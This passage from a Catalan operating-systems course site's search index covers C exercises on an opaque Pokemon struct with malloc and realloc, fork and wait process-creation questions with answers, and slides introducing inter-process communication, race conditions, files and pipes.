utilitzada en el setter de name no és segura. Pot causar buffer overflow si la nova cadena és més gran que la memòria actual. Una manera de solucionar aquest problema seria utiltizar strncpy en lloc de strcpy, però strncpy no afegeix el caràcter de finalització de cadena ‘\\0’ si la nova cadena és més gran que la mida especificada. Per tant, és important assegurar-se que la cadena de destí té prou espai per emmagatzemar la nova cadena i el caràcter de finalització.\n\n\nAra podem utilitzar els getter i setter de la següent manera:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon pikachu;\n    set_pokemon_id(&pikachu, 25);\n    set_name(&pikachu, \"Pikachu\");\n    set_height(&pikachu, 0.4);\n    set_weight(&pikachu, 6.0);\n\n    printf(\"Pokemon: %s\\n\", get_name(&pikachu));\n    printf(\"Pokemon ID: %d\\n\", get_pokemon_id(&pikachu));\n    printf(\"Pokemon Height: %f\\n\", get_height(&pikachu));\n    printf(\"Pokemon Weight: %f\\n\", get_weight(&pikachu));\n\n    return 0;\n}\nEl problema ara resideix en Pokemon pikachu; ja que no podem crear una instància de la nostra estructura de dades Pokemon ja que la definició de la nostra estructura de dades és privada. Si executeu el programa, obtindreu un error de compilació similar a aquest: error: storage size of ‘pikachu’ isn’t known. Per tant, necessitem crear una funció que ens permeti reservar memòria per a la nostra estructura de dades i retornar un punter a la nostra estructura de dades.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon Pokemon;\n\nPokemon * create_pokemon();\nvoid destroy_pokemon(Pokemon *pokemon);\n\n...\n\n#endif // _POKEMON_H_\n\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strlen(), strcpy()\n#include \"pokemon.h\"\n\nint BUFFER_SIZE = 10;\n\nPokemon * create_pokemon() {\n    Pokemon *pokemon = malloc(sizeof(Pokemon));\n    pokemon-&gt;name = malloc(BUFFER_SIZE * sizeof(char));\n    return pokemon;\n}\n\nvoid destroy_pokemon(Pokemon *pokemon) {\n    free(pokemon-&gt;name);\n    free(pokemon);\n}\n\n...\nAra podem utilitzar la nostra llibreria de la següent manera:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon *pikachu = create_pokemon();\n    set_pokemon_id(pikachu, 25);\n    set_name(pikachu, \"Pikachu\");\n    set_height(pikachu, 0.4);\n    set_weight(pikachu, 6.0);\n\n    printf(\"Pokemon: %s\\n\", get_name(pikachu));\n    printf(\"Pokemon ID: %d\\n\", get_pokemon_id(pikachu));\n    printf(\"Pokemon Height: %f\\n\", get_height(pikachu));\n    printf(\"Pokemon Weight: %f\\n\", get_weight(pikachu));\n\n    destroy_pokemon(pikachu);\n\n    return 0;\n}\nUna millora necessària seria redimensionar el camp name de la nostra estructura de dades Pokemon quan la mida de la cadena sigui més gran o més petita que la mida del buffer. Per fer-ho, podem utilitzar la funció realloc.\n/*\n * pokemon.c\n */\n\nvoid set_name(Pokemon *pokemon, char *name) {\n    if (strlen(name) != strlen(pokemon-&gt;name)) {\n        pokemon-&gt;name = realloc(pokemon-&gt;name, (strlen(name) + 1) * sizeof(char));\n    }\n    strcpy(pokemon-&gt;name, name);\n}\n\n\n\n\n\n\nImportantObservació\n\n\n\nLa funció strlen(pokemon-&gt;name) només és fiable si pokemon-&gt;name ja conté una cadena vàlida (‘\\0’). Just després de create_pokemon(), pokemon-&gt;name pot estar buida (tot i que inicialitzes amb malloc de 10 bytes, podria no tenir ‘\\0’). Millor comparar amb la mida del buffer o fer sempre realloc(strlen(name)+1).\n\n\nPer comprovar que la funció realloc funciona correctament, podem fer el següent:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon *p = create_pokemon();\n    set_name(p, \"Pikachu\");\n\n    printf(\"Pokemon: %s\\n\", get_name(p));\n    printf(\"Pokemon name size: %ld\\n\", strlen(get_name(p)));\n\n    set_name(p, \"Raichu\");\n\n    printf(\"Pokemon: %s\\n\", get_name(p));\n    printf(\"Pokemon name size: %ld\\n\", strlen(get_name(p)));\n\n    set_name(p, \"Charizard\");\n\n    printf(\"Pokemon: %s\\n\", get_name(p));\n    printf(\"Pokemon name size: %ld\\n\", strlen(get_name(p)));\n\n    destroy_pokemon(p);\n\n    return 0;\n}\nImagineu que ara voleu guardar una llista o vector de pokemons. Com ho faríeu? Una manera seria crear un vector de punters a la nostra estructura de dades Pokemon.\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon *pokemons[3];\n\n    pokemons[0] = create_pokemon();\n    set_name(pokemons[0], \"Pikachu\");\n\n    pokemons[1] = create_pokemon();\n    set_name(pokemons[1], \"Raichu\");\n\n    pokemons[2] = create_pokemon();\n    set_name(pokemons[2], \"Charizard\");\n\n    for (int i = 0; i &lt; 3; i++) {\n        printf(\"Pokemon: %s\\n\", get_name(pokemons[i]));\n    }\n\n    for (int i = 0; i &lt; 3; i++) {\n        destroy_pokemon(pokemons[i]);\n    }\n\n    return 0;\n}\nPodem complicar una mica més el disseny. Ara imagineu que voleu crear una llista dinàmica de pokemons. On un usuari us pot demanar quants pokemon vol introduir i després introduir les dades dels pokemons en temps d’execució. Com ho faríeu?\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    int n;\n    printf(\"Quants pokemons vols introduir? \");\n    scanf(\"%d\", &n);\n\n    Pokemon **pokemons = malloc(n * sizeof(Pokemon *));\n    int id;\n    char* name = malloc(100 * sizeof(char));\n    double height, weight;\n\n\n\n    for (int i = 0; i &lt; n; i++) {\n        pokemons[i] = create_pokemon();\n\n        printf(\"Introdueix les seves dades en format: id nom altura pes\\n\");\n        scanf(\"%d %s %lf %lf\", &id, name, &height, &weight);\n\n        set_pokemon_id(pokemons[i], id);\n        set_name(pokemons[i], name);\n        set_height(pokemons[i], height);\n        set_weight(pokemons[i], weight);\n        \n    }\n\n    free(name);\n\n    for (int i = 0; i &lt; n; i++) {\n        printf(\"Pokemon Name: %s\\n\", get_name(pokemons[i]));\n        printf(\"Pokemon ID: %d\\n\", get_pokemon_id(pokemons[i]));\n        printf(\"Pokemon Height: %f\\n\", get_height(pokemons[i]));\n        printf(\"Pokemon Weight: %f\\n\", get_weight(pokemons[i]));\n        printf(\"\\n\");\n    }\n\n    for (int i = 0; i &lt; n; i++) {\n        destroy_pokemon(pokemons[i]);\n    }\n\n    free(pokemons);\n\n    return 0;\n}\n\n\n\n\n\n\nImportantObservació\n\n\n\nDesprés de tots els mallocs’hauria de comprovar que no retornen NULL per assegurar-se que la reserva de memòria ha estat exitosa. Un valor molt gran de n podria fer que malloc fallés.\n\n\nD’aquesta manera podem crear una llista dinàmica de pokemons i introduir les dades dels pokemons en temps d’execució. Per exemple:\nQuants pokemons vols introduir? 3\nIntrodueix les seves dades en format: id nom altura pes\n25 Pikachu 0.4 6.0\nIntrodueix les seves dades en format: id nom altura pes\n26 Raichu 0.8 30.0\nIntrodueix les seves dades en format: id nom altura pes\n27 Sandshrew 0.6 12.0\n\n\n\n\n\n\nImportantObservació\n\n\n\nLa funció scanf(\"%s\", name) és insegur ja que pot causar un buffer overflow si l’usuari introdueix una cadena més llarga que la mida del buffer. Per evitar aquest problema, podem utilitzar la funció fgets() en lloc de scanf(). Aquesta funció ens permet especificar la mida del buffer i evita el buffer overflow.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon·"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#proposta-dexercicis-dampliació",
    "href": "activities/unit00/02-ex01-c.html#proposta-dexercicis-dampliació",
    "title": "Exercicis amb C - Pokemon",
    "section": "Proposta d’exercicis d’ampliació",
    "text": "Proposta d’exercicis d’ampliació\n\nImplementa el codi aplicant totes les millores per fer-lo més robust i segur, assegurant que l’entrada de dades sigui correcta, que no es produeixin fuites de memòria i que es comprovin els errors en el retorn de les crides d’assignació de memòria.\nCrea un Makefile per compilar tot el projecte. Ha de permetre compilar els fitxers .c i generar l’executable amb una sola comanda, així com netejar els fitxers objecte amb un make clean.\nImplementa una nova llibreria pokedex.h i pokedex.c que contingui les funcions per gestionar una Pokedex.\n\nCrea una estructura Pokedex que contingui un array dinàmic de punters a Pokemon, juntament amb els camps size i capacity.\nImplementa funcions per inicialitzar, afegir, treure, cercar i imprimir Pokémon de la Pokedex.\nQuan afegeixis un Pokémon, comprova que no existeixi cap Pokémon amb el mateix pokemon_id per evitar duplicats.\nUtilitza malloc i realloc per gestionar el creixement del array dinàmic.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon·"
    ]
  },
  {
    "objectID": "activities/unit02/01-create.html",
    "href": "activities/unit02/01-create.html",
    "title": "Exercicis de Creació de processos en C",
    "section": "",
    "text": "Quants processos es creen en executar el següent codi i quina és la seqüència d’esdeveniments?\nfork();\nif (wait(st)&gt;0)\n    fork();\nexit();\nSolució:\nAquest codi crea 3 processos en total: el procés pare i dos processos fills. La seqüència d’esdeveniments és la següent:\n\n\n\n\n\n\n    sequenceDiagram\n        autonumber\n        participant P as Pare · PID 100\n        participant F1 as Fill1 · PID 101\n        participant F2 as Fill2 · PID 102\n\n        P-&gt;&gt;F1: fork → crea F1\n        P-&gt;&gt;P: wait bloquejat\n        F1-&gt;&gt;F1: wait retorna -1\n        F1-&gt;&gt;F1: exit \n        F1--&gt;&gt;P: desbloqueja wait del PID 100, retorna 101\n        P-&gt;&gt;F2: fork → crea F2\n        P-&gt;&gt;P: exit\n        F2-&gt;&gt;F2: exit\n\n\n\n\n\n\n\n\n\n\n\n\nNota\n\n\n\nEl valors del PID són només exemples i poden variar en cada execució.\n\n\n\nQuantes vegades s’imprimirà OS?\nint main(){\n    if(execel(\"bin/ls\",\"ls\",NULL) == -1){\n    perror(\"execl\");\n    }\n    printf(\"OS\\n\");\n    return 0;\n}\nQuantes vegades wait(st) retorna -1?\nid = fork();\nwait(st); //1\nif (id==0)\n    fork();\nwait(st); //2\nexit();\nSolució: En aquest cas, wait(st) retorna -1 3 vegades. La seqüència d’esdeveniments és la següent:\n\n\n\n\n\n\n    sequenceDiagram\n        autonumber\n        participant P as Pare · PID 100\n        participant F1 as Fill1 · PID 101\n        participant N1 as Net1 · PID 102\n\n        P-&gt;&gt;F1: fork → crea F1\n        P-&gt;&gt;P: wait bloquejat //1\n        F1-&gt;&gt;F1: wait retorna -1 //1\n        F1-&gt;&gt;N1: fork → crea N1\n        F1-&gt;&gt;F1: wait bloquejat //2\n        N1-&gt;&gt;N1: wait retorna -1 //2\n        N1-&gt;&gt;N1: exit\n        N1--&gt;&gt;F1: desbloqueja wait del PID 101, retorna 102\n        F1-&gt;&gt;F1: exit\n        F1--&gt;&gt;P: desbloqueja wait del PID 100, retorna 101\n        P--&gt;&gt;P: wait retorna -1 //2\n        P-&gt;&gt;P: exit\n\n\n\n\n\n\n\nQuantes vegades wait(st) retorna -1?\nid = fork();\nwait(st); //1\nif (id!=0)\n    fork();\nwait(st); //2\nexit();\nSolució: En aquest cas, wait(st) retorna -1 3 vegades. La seqüència d’esdeveniments és la següent:\n\n\n\n\n\n\n    sequenceDiagram\n        autonumber\n        participant P as Pare · PID 100\n        participant F1 as Fill1 · PID 101\n        participant F2 as Fill2 · PID 102\n\n        P-&gt;&gt;F1: fork → crea F1\n        P-&gt;&gt;P: wait bloquejat //1\n        F1-&gt;&gt;F1: wait retorna -1 //1\n        F1-&gt;&gt;F1: wait retorna -1 //2\n        F1-&gt;&gt;F1: exit\n        F1--&gt;&gt;P: desbloqueja wait del PID 100, retorna 101\n        P-&gt;&gt;F2: fork → crea F2\n        P-&gt;&gt;P: wait bloquejat //2\n        F2-&gt;&gt;F2: wait retorna -1 //2\n        F2-&gt;&gt;F2: exit\n        F2--&gt;&gt;P: desbloqueja wait del PID 100, retorna 102\n        P-&gt;&gt;P: exit\n\n\n\n\n\n\n\nAnalitza el següent codi i respon les preguntes:\nint main(void) {\n    int a = 1;\n    pid_t fork_ret = fork();\n    if (fork_ret &gt; 0) {\n        a++;\n        fprintf(stdout, \"Parent: int a is %d at %p\\n\", a, &a);\n        } else if (fork_ret == 0) { a++;}\n        fprintf(stdout, \"Child: int a is %d at %p\\n\", a, &a);\n    return 0;\n}\n\nQuin és el valor de a en el procés pare i en el procés fill?\nS’imprimirà la mateixa adreça de memòria per a a en el procés pare i en el procés fill?\nS’imprimirà a la mateixa sortida estàndard (STDOUT) en el procés pare i en el procés fill?\n\nAnalitza el següent codi i justifica quin serà el resultat de la seva execució:\nint main(void) {\n    int* stuff = malloc(sizeof(int));\n    *stuff = 5;\n    pid_t fork_ret = fork();\n    printf(\"The last digit of pi is %d\\n\", *stuff);\n    if (fork_ret == 0)\n        *stuff = 6;\n    return 0;\n}\nQuina és la sortida del següent codi?\nint main()\n{\n    switch(fork()){\n        case 0: printf(\"A\");\n                switch(fork()){\n                    case 0: printf(\"B\");exit(0);\n                    default: switch(fork()){\n                        case 0: printf(\"C\");exit(0);\n                        default: wait(&st);wait(&st);exit(0);\n                    }            \n                wait(&st);\n                }\n        default: wait(&st); exit(0);\n    }\n}\nIndiqueu quin és el resultat de l’execució del següent codi. Nombre de processos creats, parantiu, informació de stdout, procés zombi, etc.\n#define N 10\nint main()\n{\n    int pid = getpid();\n    for (int x=0; x&lt;N x++)\n    {\n        switch(fork())\n        {\n            case 0:\n                if ( (pid%2) == 0 )\n                    printf(\"Pid Fill: %d\\n\", getpid());\n                    exit(0); //3\n                break;\n\n            default:\n                if ( (pid%2) !== 0 )\n                    exit(0); //2\n                break;\n        }\n    }\n    wait(NULL);\n    exit(0); //1\n}\nSolució:\nEl comportament del codi depèn de si el pid del procés pare és parell o senar:\n\nCas parell:\n\n\n\n\n\n\n\n    sequenceDiagram\n    autonumber\n    participant P as Pare (PID parell)\n    participant F1 as Fill1\n    participant F2 as Fill2\n    participant Fx as ...\n    participant F10 as Fill10\n\n    P-&gt;&gt;F1: fork() crea Fill1\n    F1-&gt;&gt;F1: printf(\"Pid Fill: 101\") i exit() //3\n    P-&gt;&gt;F2: fork() crea Fill2\n    F2-&gt;&gt;F2: printf(\"Pid Fill: 102\") i exit() //3\n    P-&gt;&gt;Fx: fork() crea FillX\n    Fx-&gt;&gt;Fx: printf(\"Pid Fill: 10X\") i exit() //3\n    P-&gt;&gt;F10: fork() crea Fill10\n    F10-&gt;&gt;F10: printf(\"Pid Fill: 110\") i exit() //3\n    \n    P-&gt;&gt;P: wait()\n    Note over P,F10: Pare fa wait(NULL) al final i recull un fill\n    P-&gt;&gt;P: exit() //1\n\n\n\n\n\n\n\nEl procés pare crea 10 fills, un a cada iteració del bucle.\nEls fills acaben immediatament amb la crida a exit(0).\nEl pare, no fa cap wait() dins del bucle, per tant, els fills es converteixen en processos zombis temporals.\nEl pare únicament fa un wait() al final del bucle, per tant, el procés pare rebra la notificació de la finalització d’un fill i acabarà.\nTots els processos fills -1 acaben en estat zombi.\nTots els processos orfes fins que init els recull.\nCas senar:\n\n\n\n\n\n\n    sequenceDiagram\n    autonumber\n    participant P as Pare (PID senar)\n    participant F as Fill\n    participant N as Net\n    participant P10 as Pare 10e\n    participant F10 as Fill 10e\n\n    P-&gt;&gt;F: fork() crea Fill\n    P-&gt;&gt;P: exit() //2\n    F-&gt;&gt;N: fork() crea Net\n    F-&gt;&gt;F: exit() //2\n\n    P10-&gt;&gt;F10: fork() crea Fill 10e\n    P10-&gt;&gt;P10: exit() //2\n    F10-&gt;&gt;F10: surt del bucle\n    F10-&gt;&gt;F10: wait() retorna -1\n    F10-&gt;&gt;F10: exit()\n\n\n\n\n\n\n\nEn aquest cas, el pare acaba després de crear el primer fill.\nCada iteració del bucle, el nou pare (fill iteració anterior) crea un fill i acaba.\nEs creen 10 generacions a partir del pare: P -&gt; F -&gt; N -&gt; BN …\nCap pare fa cap wait(), per tant, tots els fills es converteixen en processos zombis.\nL’últim fill executarà el wait() i com no té fills, retornarà -1 i acabarà.\nTots els processos fills acaben en estat zombi temporal.\nTots els processos fills esdevenen orfes fins que init els recull.",
    "crumbs": [
      "Activitats",
      "Unitat 03",
      "Exercici · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#repàs-de-gestió-de-processos",
    "href": "slides/03-communicate.html#repàs-de-gestió-de-processos",
    "title": "Comunicació de processos",
    "section": "Repàs de gestió de processos",
    "text": "Repàs de gestió de processos\necho \"Missatge enviat\" &gt; missatge.txt\n\n\n\n\n\n\n\n\nExercici\n\n\nImplementeu un programa en C que simuli aquest comportament.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#comunicació-entre-processos-ipc",
    "href": "slides/03-communicate.html#comunicació-entre-processos-ipc",
    "title": "Comunicació de processos",
    "section": "Comunicació entre processos (IPC)",
    "text": "Comunicació entre processos (IPC)\nEn un sistema operatiu multiprogramat o distribuït, diversos processos s’executen concurrentment i sovint necessiten intercanviar dades, sincronitzar accions o compartir recursos. Aquest intercanvi s’anomena Inter-Process Communication (IPC).\n\nCoordinació i sincronització entre processos independents.\nTransferència d’informació sense accedir directament a l’espai d’adreces dels altres processos.\nCompartició controlada de recursos (fitxers, memòria, dispositius, sockets).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#reptes-de-la-comunicació-ipc",
    "href": "slides/03-communicate.html#reptes-de-la-comunicació-ipc",
    "title": "Comunicació de processos",
    "section": "Reptes de la comunicació (IPC)",
    "text": "Reptes de la comunicació (IPC)\n\nCom es pot transferir la informació entre processos? Recorda que els processos operen en espais d’adreçes independents. Per tant, no poden accedir a la mateixa informació.\nCom es pot assegurar que dos processos no intentin accedir simultàniament a la mateixa informació? Imagina’t 2 processos executant una reserva en un avió i els dos processos assignen el mateix seient a dos passatgers diferents.\nCom es poden coordinar els processos dependents entre si? Imagina’t un procés que genera dades i un altre procés que les processa. El procés que processa les dades necessita esperar a que el procés que les genera les hagi generat totes.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemples-de-comunicaciósincronització",
    "href": "slides/03-communicate.html#exemples-de-comunicaciósincronització",
    "title": "Comunicació de processos",
    "section": "Exemples de comunicació/sincronització",
    "text": "Exemples de comunicació/sincronització\n\nComunicació: Intercanvi d’informació.\n\n\ncat missatge.txt | grep \"e\"\n\n\nSincronització: Coordinació en l’accés als recursos i en l’ordre d’execució de les tasques.\n\n\necho \"hola1\"; echo \"adeu1\" && echo \"hola2\" || echo \"adeu2\"\n\n\n\nEl ; permet executar les comandes de forma seqüencial.\nEl && permet executar la segona comanda si la primera s’ha executat correctament.\nEl || permet executar la segona comanda si la primera no s’ha executat correctament.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#cat-missatge.txt-grep-e",
    "href": "slides/03-communicate.html#cat-missatge.txt-grep-e",
    "title": "Comunicació de processos",
    "section": "cat < missatge.txt | grep \"e\"",
    "text": "cat &lt; missatge.txt | grep \"e\"",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#esquema-de-la-comunicaciósincronització",
    "href": "slides/03-communicate.html#esquema-de-la-comunicaciósincronització",
    "title": "Comunicació de processos",
    "section": "Esquema de la comunicació/sincronització",
    "text": "Esquema de la comunicació/sincronització\n\n\nProcés 1\nwhile(!FiTasca1){\n  EsperarFiTasca1();\n}\n\nwhile(ExisteixTasca){\n  dades = FerTasca2();\n  EnviarMissatge(pid2,dades);\n}\n\nProcés 2\nRealitzarTasca1();\nAvisarTasca1Completada();\n\nwhile(ExisteixTasca){;\n  RebreMissatge(pid2, &dades);\n  RealitzarTasca(dades);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-cua-dimpressió",
    "href": "slides/03-communicate.html#exemple-cua-dimpressió",
    "title": "Comunicació de processos",
    "section": "Exemple: Cua d’impressió",
    "text": "Exemple: Cua d’impressió\nAssumeix que un proces A vol imprimir un document:\n\nEl procés A ha d’introduir el nom del fitxer a imprimir en una cua d’impressió.\nEl servei d’impressió procés B de forma periòdica revisa la cua d’impressió i imprimeix els fitxers que hi ha en la cua.\n\n\nPer fer-ho, implementem una cua d’impressió amb dos variables una que apunta al següent slot a imprimir (out) i una al següent slot lliure (in).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-cua-dimpressió-1",
    "href": "slides/03-communicate.html#exemple-cua-dimpressió-1",
    "title": "Comunicació de processos",
    "section": "Exemple: Cua d’impressió",
    "text": "Exemple: Cua d’impressió\n\n\n\nEl procés A llegeix la variable in i escriu el valor 7 en una variable local (next_free_slot).\nEl SO interromp el procés A i executa el procés B.\nEl procés B llegeix la variable in i escriu el valor 7 en una variable local (next_free_slot).\nEl procés B col·loca un fitxer a la cua d’impressió al slot 7 i el servei d’impressió modifica les variables in i out.\nEl procés B realitza altres tasques no relacionades amb la cua d’impressió.\nEl SO interromp el procés B i executa el procés A. El procés A utilitza la seva variable local (next_free_slot) per a escriure el fitxer a la cua d’impressió. El fitxer s’escriu al slot 7, i també actualitza les variables in i out.\n\n\n\n\nEl procés B ha perdut la impressió del fitxer. El procés A l’ha sobrescrit.\nEl servei d’impressió no ha notat cap inconsistencia en les variables in i out.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#condicions-de-carrera",
    "href": "slides/03-communicate.html#condicions-de-carrera",
    "title": "Comunicació de processos",
    "section": "Condicions de carrera",
    "text": "Condicions de carrera\nLes condicions de carrera es produeixen quan dos o més processos o fils d’execució intenten accedir simultàniament a recursos compartits o a dades sense la deguda sincronització.\n\nProblemes\nPoden conduir a resultats inesperats o incorrectes en les operacions i a la inconsistència de les dades compartides.\n\n\nSolucions\n\nExclusió Mútua: Utilitzar mecanismes com semàfors, mutex o candaus per a garantir que només un procés pugui accedir als recursos compartits a la vegada.\nSincronització: Coordinar l’execució dels processos mitjançant sincronització de manera que no interfereixin entre ells quan accedeixen als recursos compartits.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#evitar-les-condicions-de-carrera",
    "href": "slides/03-communicate.html#evitar-les-condicions-de-carrera",
    "title": "Comunicació de processos",
    "section": "Evitar les condicions de carrera",
    "text": "Evitar les condicions de carrera\nLa secció crítica és la part del codi on s’accedeix a recursos compartits. Per a evitar les condicions de carrera, els processos han de complir les següents condicions:\n\nDos processos no poden estar simultàniament en la secció crítica.\nNo s’ha d’assumir que els processos són executats de forma ràpida o lenta.\nCap procés que no estigui en la secció crítica pot bloquejar altres processos.\nCap procés ha d’esperar per sempre per entrar a la secció crítica.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#tipus-de-comunicació",
    "href": "slides/03-communicate.html#tipus-de-comunicació",
    "title": "Comunicació de processos",
    "section": "Tipus de comunicació",
    "text": "Tipus de comunicació\nPas de missatges\n\nPermet integrar tasques de comunicació i sincronització entre processos situats en una mateixa màquina o en màquines distribuïdes.\nUn missatge és un conjunt de dades intercanviades per 2 o més processos.\n\n\nMemòria compartida\n\nEls processos es comuniquen utilitzant variables o zones de memòria compartida.\nS’utilitzen per comunicar processos en una mateixa màquina.\nEs necessita regular l’accés a la informació compartida per garantir el resultat òptim i evitar les race conditions.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#característiques-de-la-comunicació-i",
    "href": "slides/03-communicate.html#característiques-de-la-comunicació-i",
    "title": "Comunicació de processos",
    "section": "Característiques de la comunicació (I)",
    "text": "Característiques de la comunicació (I)\nIdentificació\n\nMecanismes de noms\n\nSense nom\nNom local\nNom de la red\n\nIdentificador de destí\n\nDirecte: S’ha d’indicar el procés origen i destí. El missatge s’envia a un procés concret utilitzant el seu pid. El receptor pot (indicar o no) el procés que vol rebre el missatge.\nIndirecte: Els missatges s’envien a una zona contreta (bustia o port), sense identificar de forma explícita el destí.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#característiques-de-la-comunicació-ii",
    "href": "slides/03-communicate.html#característiques-de-la-comunicació-ii",
    "title": "Comunicació de processos",
    "section": "Característiques de la comunicació (II)",
    "text": "Característiques de la comunicació (II)\nFlux de dades\n\nUnidireccional\nBidireccional\n\n\nBuffering\n\nAmb buffers\nSense buffers\n\n\n\nSincronització\n\nSincrons (bloquejants)\nAsíncrons (no bloquejants)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#tipus-de-mecanismes",
    "href": "slides/03-communicate.html#tipus-de-mecanismes",
    "title": "Comunicació de processos",
    "section": "Tipus de mecanismes",
    "text": "Tipus de mecanismes\n\nFitxers.\nPipes.\nFIFOS (Pipes amb nom).\nCues de missatges.\nSockets.\nMemòria compartida (IPC).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#fitxers",
    "href": "slides/03-communicate.html#fitxers",
    "title": "Comunicació de processos",
    "section": "Fitxers",
    "text": "Fitxers\nLa comunicació entre processos a través dels sistemes de fitxers és una manera simple d’intercanviar informació entre ells. Això implica que dos o més processos acorden un fitxer pel seu nom i el utilitzen per a la comunicació. Un dels processos escriu al fitxer mentre que un altre processos llegeix el contingut del fitxer.\nLimitacions\n\nPersistència: Els fitxers són persistents, la informació roman en disc fins que s’elimina de forma explícita. Això no és òptim per a la comunicació efímera o temporal entre processos.\nProblemes de Sincronització: Cal gestionar la sincronització de forma manual per garantir que un procés no llegeixi el fitxer abans que un altre procés hagi acabat d’escriure-hi. Aquesta sincronització pot ser complexa i pot conduir a errors si no es gestiona adequadament.\nEficiència: L’ús de fitxers per a la comunicació no és eficient en termes de rendiment, ja que involucra operacions d’entrada i sortida a disc, que són més lentes que altres mètodes de comunicació en memòria.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicació-amb-fitxers",
    "href": "slides/03-communicate.html#exemple-comunicació-amb-fitxers",
    "title": "Comunicació de processos",
    "section": "Exemple: Comunicació amb fitxers",
    "text": "Exemple: Comunicació amb fitxers\nUn procés 1 (escriptor) escriu un missatge en un fitxer anomenat fitxer_comunicacio.txt.\n// Process 1 (escriptor)\nint fd = open(\"fitxer_comunicacio.txt\", O_WRONLY | O_CREAT, 0644);\nwrite(fd, \"Missatge des de Process 1\", strlen(\"Missatge des de Process 1\"));\nclose(fd);\nUn procés 2 (lector) llegeix el missatge d’aquest fitxer i el mostra per pantalla.\n// Process 2 (lector)\nint fd = open(\"fitxer_comunicacio.txt\", O_RDONLY);\nchar buffer[100];\nread(fd, buffer, 100);\nclose(fd);\nprintf(\"Missatge rebut: %s\\n\", buffer);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#pipes",
    "href": "slides/03-communicate.html#pipes",
    "title": "Comunicació de processos",
    "section": "Pipes",
    "text": "Pipes\nEls pipes són dispositius lògics dissenyats per permetre la comunicació entre processos. Es comporten com una cua de caràcters amb una longitud fixa on els processos poden llegir o escriure.\n\nSense Nom: Els pipes són anònims, el que significa que no estan associats amb un fitxer del sistema de fitxers.\nÚs Amb fork(): Es poden heretar i utilitzar fàcilment.\nIdentificació: Es caracteritzen per tenir dos descriptors de fitxers, un per a l’escriptura i un altre per a la lectura.\nFlux de Dades Unidireccional: El flux de dades als pipes és unidireccional, la informació només es mou d’una direcció, és a dir, del procés escriptor al procés lector.\nAmb Buffering: Els pipes utilitzen un mecanisme que permet acumular dades fins que es llegeixin.\nRestriccions d’Àmbit Local: Comunicació entre processos a la mateixa màquina, ja que no estan dissenyats per a la comunicació a través de xarxes.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicació-amb-pipes-bash",
    "href": "slides/03-communicate.html#exemple-comunicació-amb-pipes-bash",
    "title": "Comunicació de processos",
    "section": "Exemple: Comunicació amb Pipes (Bash)",
    "text": "Exemple: Comunicació amb Pipes (Bash)\nEn bash, podem utilitzar pipes per a comunicar dos processos. Per exemple, podem utilitzar el comandament echo per a enviar un missatge a través d’un pipe i el comandament cat per a llegir aquest missatge.\necho \"Missatge des de Process Pare\" | echo \"Missatge rebut: $(cat)\"",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicació-amb-pipes-c",
    "href": "slides/03-communicate.html#exemple-comunicació-amb-pipes-c",
    "title": "Comunicació de processos",
    "section": "Exemple: Comunicació amb pipes (C)",
